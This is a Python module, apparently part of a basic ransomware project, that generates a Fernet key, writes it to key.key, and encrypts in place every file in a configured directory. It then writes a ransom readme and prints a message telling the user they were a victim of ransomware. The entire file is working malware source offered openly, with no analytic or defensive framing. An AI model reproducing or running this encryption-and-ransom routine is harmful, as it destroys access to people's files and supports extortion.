from cryptography.fernet import Fernet
from main.functions import file_operator as file_opt
import os
from main.constants import const as cs

def generate_Key():
    key = Fernet.generate_key()
    # with open("key.key", "wb") as key_file:
    #     key_file.write(key)
    file_opt.create_key(key)

def return_Key():
    return open("key.key", "rb").read()

def encrypt_data(items, key):
    a = Fernet(key)
    for item in items:
        # with open(item, "rb") as file:
        #     file_data = file.read()
        file_data = file_opt.read_data(item)
        
        data = a.encrypt(file_data)

        file_opt.encrypt_data(item, data)

        # with open(item, "wb") as file:
        #     file.write(data)

def execute():
    items = os.listdir(cs.PATH_ENC)
    target_path = [cs.PATH_ENC+i for i in items]
    
    generate_Key()
    key = return_Key()
    encrypt_data(target_path, key)

    file_opt.create_ransom_readme()
    print("You were a victim of Ransomware! Check Readme.txt.")
    # with open(cs.PATH_ENC+"readme.txt", "w") as file:
    #     file.write("Files encrypted.")
    #     file.write("Ransom is requested.")